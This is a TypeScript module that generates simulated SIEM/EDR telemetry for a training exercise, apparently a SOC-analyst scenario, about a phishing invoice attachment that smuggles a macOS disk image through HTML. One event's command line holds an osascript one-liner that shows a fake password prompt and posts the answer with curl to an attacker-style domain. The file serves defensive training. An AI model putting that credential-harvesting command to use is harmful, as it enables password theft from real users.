/**
 * Events-only half of the ./gwsPhishingAttachment.ts scenario pack.
 *
 * The dashboard's live feed runs in the browser (attackStories.ts), so what it
 * imports ships in a public /_next/static chunk. The answer key (questions,
 * answers, explanations, IOCs, killchain, narrative) stays in the builder in
 * ./gwsPhishingAttachment.ts, which composes this module on the server. Keep anything
 * answer-bearing out of this file: every visitor can read it.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { makeSha256 } from "@/lib/sim/iocs";

/** Telemetry half of `buildGwsPhishingAttachmentScenario`: the events and the story title, no answer key. */
export function gwsPhishingAttachmentScenarioEvents() {
  const B = new Date("2026-07-02T08:31:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const host = { hostname: "LAP-003", ip: "10.8.4.61" };
  const victim = { email: "s.amir@rocketstack.io", name: "Shira Amir", sam: "s.amir" };

  // A real supplier the company genuinely works with. The mailbox is
  // compromised; the domain is not spoofed.
  const supplier = { email: "billing@northline-print.co.uk", domain: "northline-print.co.uk" };

  const c2 = "doc-verify-cdn.com";

  const attachmentHash = makeSha256("northline_invoice_8842_html_smuggling_2026");
  const droppedHash    = makeSha256("invoice_8842_lnk_dropper_payload_2026");
  const chromeHash     = makeSha256("google_chrome_helper_signed_binary_2026");
  const osascriptHash  = makeSha256("macos_usr_bin_osascript_apple_signed");

  // EDR↔scenario integration (Phase 4): ONE incident spanning two planes — the
  // email/identity side (Google Workspace delivery inside a real supplier thread,
  // and the same attachment fanning out to other mailboxes) AND the host side
  // (macOS endpoint: mounted DMG → unnotarized app → osascript). edr_scope
  // "hybrid": the analyst pivots to EDR to walk the process tree on LAP-003 while
  // the mail-borne delivery and tenant spread are investigated on the GWS plane,
  // correlated by incident_id. Alert-grade EDR rows: the osascript execution crux
  // and the Falcon detection; the earlier EDR file/process events are pivot-only.
  const INCIDENT = "inc:gws:1";

  const events: TelemetryEvent[] = [
    // ---------------------------------------------------------------------
    // 1. Delivered. Authenticated. Inside a real thread.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_01_email_delivered",
      ts: T(0),
      source: "gws",
      vendor: "Google Workspace",
      event_type: "email_received",
      user_email: victim.email,
      user_title: "Operations Lead",
      severity: "low",
      mitre_technique: "T1566.001",
      mitre_tactic: "Initial Access",
      description:
        "Gmail delivered a reply from billing@northline-print.co.uk into an existing invoice thread at 08:31, with one HTML attachment. SPF, DKIM and DMARC all passed.",
      raw: {
        "gws.event.type": "message_delivered",
        "gws.event.name": "email_log_search",
        "gws.message_id": "<CAF3n2rQ8xK9v@mail.northline-print.co.uk>",
        "gws.sender": supplier.email,
        "gws.recipient": victim.email,
        "gws.subject": "RE: PO-4417 — revised invoice attached",
        "gws.direction": "INBOUND",
        "gws.message_size_bytes": "241844",
        "gws.attachment.count": "1",
        "gws.attachment.0.name": "Invoice_8842.html",
        "gws.attachment.0.sha256": attachmentHash,
        "gws.attachment.0.mime_type": "text/html",
        "gws.spf_result": "PASS",
        "gws.dkim_result": "PASS",
        "gws.dkim_domain": supplier.domain,
        "gws.dmarc_result": "PASS",
        "gws.dmarc_policy": "quarantine",
        "gws.tls_encrypted": "true",
        "gws.spam_score": "0.4",
        "gws.classification": "INBOX",
        "gws.in_reply_to": "<CAB7k1pL2mN4t@mail.rocketstack.io>",
        "gws.thread_id": "thread-a4f1c9d20e",
        "event.action": "email-delivered",
        "event.outcome": "success",
        "user.email": victim.email,
      },
    },

    // ---------------------------------------------------------------------
    // 2. The user opens the attachment. Chrome writes a file to Downloads —
    //    the HTML built it locally rather than fetching it.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_02_attachment_opened",
      ts: T(14 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "file_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "medium",
      mitre_technique: "T1027.006",
      mitre_tactic: "Defense Evasion",
      description:
        "At 08:45 Google Chrome wrote /Users/s.amir/Downloads/Invoice_8842.dmg, 4.1 MB, with no preceding download request in the network log.",
      file: {
        name: "Invoice_8842.dmg",
        path: "/Users/s.amir/Downloads/Invoice_8842.dmg",
        extension: "dmg",
        size: 4_294_967,
        sha256: droppedHash,
      },
      raw: {
        "crowdstrike.event_simpleName": "FileWritten",
        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
        "crowdstrike.platform": "Mac",
        "event.action": "file_created",
        "file.name": "Invoice_8842.dmg",
        "file.path": "/Users/s.amir/Downloads/Invoice_8842.dmg",
        "file.size": "4294967",
        "file.hash.sha256": droppedHash,
        "process.name": "Google Chrome",
        "process.pid": "4412",
        "process.executable": "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
        "process.hash.sha256": chromeHash,
        "user.name": victim.sam,
        "host.name": host.hostname,
        "host.os.family": "darwin",
        "host.os.name": "macOS",
        "host.ip": host.ip,
      },
    },

    // ---------------------------------------------------------------------
    // 3. The image is mounted and the app inside it is launched.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_03_dmg_mount",
      ts: T(16 * MIN + 20_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1204.002",
      mitre_tactic: "Execution",
      description:
        "Finder mounted the disk image at 08:47:20 and launched Invoice Viewer.app from the mounted volume.",
      process: {
        name: "Invoice Viewer",
        pid: 5188,
        path: "/Volumes/Invoice_8842/Invoice Viewer.app/Contents/MacOS/Invoice Viewer",
        parent_name: "Finder",
        parent_pid: 812,
        cmdline: "/Volumes/Invoice_8842/Invoice Viewer.app/Contents/MacOS/Invoice Viewer",
        user: victim.sam,
        integrity: "medium",
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "User Execution: Malicious File",
        "crowdstrike.detection.technique_id": "T1204.002",
        "crowdstrike.detection.severity": "High",
        "crowdstrike.detection.pattern_disposition": "10",
        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
        "crowdstrike.platform": "Mac",
        "event.action": "process_created",
        "process.name": "Invoice Viewer",
        "process.pid": "5188",
        "process.executable": "/Volumes/Invoice_8842/Invoice Viewer.app/Contents/MacOS/Invoice Viewer",
        "process.parent.name": "Finder",
        "process.parent.pid": "812",
        "process.code_signature.status": "unsigned",
        "process.code_signature.notarized": "false",
        "user.name": victim.sam,
        "host.name": host.hostname,
        "host.os.family": "darwin",
        "host.os.name": "macOS",
      },
    },

    // ---------------------------------------------------------------------
    // 4. The "viewer" asks the OS to run a script — the classic macOS step.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_04_osascript",
      ts: T(16 * MIN + 24_000),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      mitre_technique: "T1059.002",
      mitre_tactic: "Execution",
      is_detection: true, // alert-grade: the behavioural crux — an unnotarized app spawning osascript to exfil a phished password
      description:
        "Four seconds later the app spawned /usr/bin/osascript running an AppleScript that presents a password dialog and pipes the answer to curl.",
      process: {
        name: "osascript",
        pid: 5203,
        path: "/usr/bin/osascript",
        parent_name: "Invoice Viewer",
        parent_pid: 5188,
        cmdline:
          "osascript -e 'display dialog \"Invoice Viewer requires your password to continue\" default answer \"\" with hidden answer' -e 'do shell script \"curl -s -X POST https://doc-verify-cdn.com/v/1 -d @-\"'",
        user: victim.sam,
        integrity: "medium",
        hash: { sha256: osascriptHash },
      },
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.tactic_id": "TA0002",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: AppleScript",
        "crowdstrike.detection.technique_id": "T1059.002",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.pattern_disposition": "2048",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
        "crowdstrike.platform": "Mac",
        "event.action": "process_created",
        "process.name": "osascript",
        "process.pid": "5203",
        "process.executable": "/usr/bin/osascript",
        "process.command_line":
          "osascript -e 'display dialog \"Invoice Viewer requires your password to continue\" default answer \"\" with hidden answer' -e 'do shell script \"curl -s -X POST https://doc-verify-cdn.com/v/1 -d @-\"'",
        "process.hash.sha256": osascriptHash,
        "process.code_signature.subject_name": "Software Signing",
        "process.code_signature.status": "trusted",
        "process.parent.name": "Invoice Viewer",
        "process.parent.pid": "5188",
        "user.name": victim.sam,
        "host.name": host.hostname,
        "host.os.family": "darwin",
        "host.os.name": "macOS",
      },
    },

    // ---------------------------------------------------------------------
    // 5. The outbound POST is refused at the perimeter.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_05_c2_blocked",
      ts: T(16 * MIN + 25_000),
      source: "firewall",
      vendor: "FortiGate",
      event_type: "http_blocked",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "high",
      mitre_technique: "T1041",
      mitre_tactic: "Exfiltration",
      description:
        "The POST to doc-verify-cdn.com/v/1 was denied by the web filter under the category Newly Observed Domain.",
      network: { url: `https://${c2}/v/1`, domain: c2, method: "POST", status: 0 },
      raw: {
        "data.type": "utm",
        "data.subtype": "webfilter",
        "data.level": "warning",
        "data.logid": "0316013056",
        "data.vd": "root",
        "data.action": "blocked",
        "data.policyid": "17",
        "data.srcip": host.ip,
        "data.srcname": host.hostname,
        "data.dstip": "23.129.64.211",
        "data.dstport": "443",
        "data.hostname": c2,
        "data.url": "/v/1",
        "data.method": "POST",
        "data.catdesc": "Newly Observed Domain",
        "data.cat": "90",
        "data.msg": "URL belongs to a denied category in policy",
        "data.eventtime": String(new Date(T(16 * MIN + 25_000)).getTime() * 1_000_000),
        "rule.id": "81605",
        "rule.level": "6",
        "rule.description": "FortiGate: Web filter blocked URL",
        "rule.groups": ["fortigate", "webfilter"],
      },
    },

    // ---------------------------------------------------------------------
    // 6. Falcon's verdict on the chain.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_06_edr_alert",
      ts: T(17 * MIN),
      source: "edr",
      vendor: "CrowdStrike Falcon",
      event_type: "edr_alert",
      hostname: host.hostname,
      user_email: victim.email,
      src_ip: host.ip,
      severity: "critical",
      is_detection: true,    // the Falcon detection — the endpoint alert that opens the ticket
      edr_scope: "hybrid",   // spans host (macOS execution chain) + email/identity (GWS delivery + tenant spread) → pivot to EDR for the host
      description:
        "Falcon raised a Critical detection on LAP-003 for an unnotarized app from a mounted volume spawning osascript, and killed the osascript process.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.detection.name": "UnnotarizedAppSpawnsScriptInterpreter",
        "crowdstrike.detection.description":
          "An unsigned application launched from a mounted disk image spawned osascript with an embedded shell command to a remote host.",
        "crowdstrike.detection.severity": "Critical",
        "crowdstrike.detection.confidence": "95",
        "crowdstrike.detection.tactic": "Execution",
        "crowdstrike.detection.technique": "Command and Scripting Interpreter: AppleScript",
        "crowdstrike.detection.technique_id": "T1059.002",
        "crowdstrike.detection.pattern_disposition_description": "Detection, Process Killed",
        "crowdstrike.detection.process_tree": "Finder > Invoice Viewer > osascript",
        "crowdstrike.sensor.id": "f2b90d5417ae4c63b8107d92ea5f3c40",
        "crowdstrike.platform": "Mac",
        "crowdstrike.network_containment_state": "Not Contained",
        "event.action": "alert",
        "event.outcome": "blocked",
        "host.name": host.hostname,
        "host.os.family": "darwin",
        "host.os.name": "macOS",
        "user.name": victim.sam,
      },
    },

    // ---------------------------------------------------------------------
    // 7. Mail-log context: this sender is real, and this is the first
    //    attachment they have ever sent that was not a PDF.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_07_sender_history",
      ts: T(22 * MIN),
      source: "gws",
      vendor: "Google Workspace",
      event_type: "email_received",
      user_email: victim.email,
      severity: "medium",
      description:
        "A mail-log search for this sender returns 41 delivered messages over 14 months, all authenticated, with attachment types recorded.",
      raw: {
        "gws.event.type": "email_log_search",
        "gws.query.sender": supplier.email,
        "gws.query.window_days": "420",
        "gws.result.message_count": "41",
        "gws.result.first_seen": "2025-05-08T09:12:00Z",
        "gws.result.recipients": ["s.amir@rocketstack.io", "finance@rocketstack.io"],
        "gws.result.spf_pass_rate": "41/41",
        "gws.result.dmarc_pass_rate": "41/41",
        "gws.result.attachment_types_seen": ["application/pdf"],
        "gws.result.attachment_types_seen_last_30d": ["application/pdf", "text/html"],
        "gws.result.html_attachments_before_today": "0",
        "event.action": "log-search",
        "event.outcome": "success",
      },
    },

    // ---------------------------------------------------------------------
    // 8. The same HTML attachment went to two other mailboxes in the tenant.
    // ---------------------------------------------------------------------
    {
      id: "evt_gws_08_tenant_spread",
      ts: T(24 * MIN),
      source: "gws",
      vendor: "Google Workspace",
      event_type: "email_received",
      severity: "high",
      description:
        "A search on the attachment hash finds the same file delivered to two further mailboxes in the tenant this morning, both still unopened.",
      raw: {
        "gws.event.type": "email_log_search",
        "gws.query.attachment_sha256": attachmentHash,
        "gws.result.message_count": "3",
        "gws.result.recipients": [
          "s.amir@rocketstack.io",
          "finance@rocketstack.io",
          "d.shapira@rocketstack.io",
        ],
        "gws.result.senders": [supplier.email],
        "gws.result.delivered_between": ["2026-07-02T08:31:00Z", "2026-07-02T08:36:00Z"],
        "gws.result.opened_count": "1",
        "gws.result.classification": "INBOX",
        "event.action": "log-search",
        "event.outcome": "success",
      },
    },
  ];

  // Every event — host EDR chain and GWS email plane alike — belongs to the one
  // phishing-attachment incident (the SIEM↔EDR correlation key).
  for (const e of events) e.incident_id = INCIDENT;

  return { title: "Shared Invoice — Malicious Attachment via Google Workspace", events, T, MIN, host, supplier, c2, attachmentHash, droppedHash };
}
